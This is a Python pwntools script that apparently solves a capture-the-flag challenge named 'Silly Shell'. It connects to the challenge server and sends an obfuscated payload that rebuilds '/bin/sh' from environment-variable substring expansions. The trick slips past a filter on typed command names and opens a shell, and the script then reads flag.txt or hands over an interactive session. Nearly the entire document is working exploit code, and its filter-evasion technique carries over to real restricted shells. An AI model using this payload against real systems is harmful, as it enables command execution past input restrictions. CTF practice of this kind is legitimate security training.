#!/usr/bin/env python3
from pwn import *
import argparse


def build_payload() -> str:
    # Build '/bin/sh' from env var expansions so we never type lowercase command names.
    return "A=${PATH#*:*:*:*:};A=${A#?};S=${A%${A#?}};C=${HOME#??};H=${C%${C#?}};B=${PATH##*:};${B}/${S}${H}"


def solve(host: str, port: int, do_cat: bool, do_interactive: bool) -> None:
    io = remote(host, port)

    io.recvuntil(b"SillyShell$ ")
    io.sendline(build_payload().encode())

    if do_cat:
        io.sendline(b"echo __START__")
        io.sendline(b"cat flag.txt")
        io.sendline(b"echo __END__")

        data = io.recvrepeat(2.0)
        text = data.decode(errors="ignore")

        if "__START__" in text and "__END__" in text:
            between = text.split("__START__", 1)[1].split("__END__", 1)[0]
            lines = [x.strip() for x in between.splitlines() if x.strip()]
            flag = next((x for x in lines if "sillyCTF{" in x and "}" in x), None)
        else:
            flag = None

        if flag:
            log.success(f"FLAG: {flag}")
        else:
            log.info("Raw output:")
            print(text)

    if do_interactive:
        io.interactive()
    else:
        io.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Silly Shell solver")
    parser.add_argument("host", nargs="?", default="tcp.sillyctf.psuccso.org")
    parser.add_argument("port", nargs="?", type=int, default=32488)
    parser.add_argument("--no-cat", action="store_true", help="Do not run 'cat flag.txt'")
    parser.add_argument("-i", "--interactive", action="store_true", help="Drop to interactive shell")
    args = parser.parse_args()

    context.log_level = "info"
    solve(args.host, args.port, do_cat=not args.no_cat, do_interactive=args.interactive)


if __name__ == "__main__":
    main()
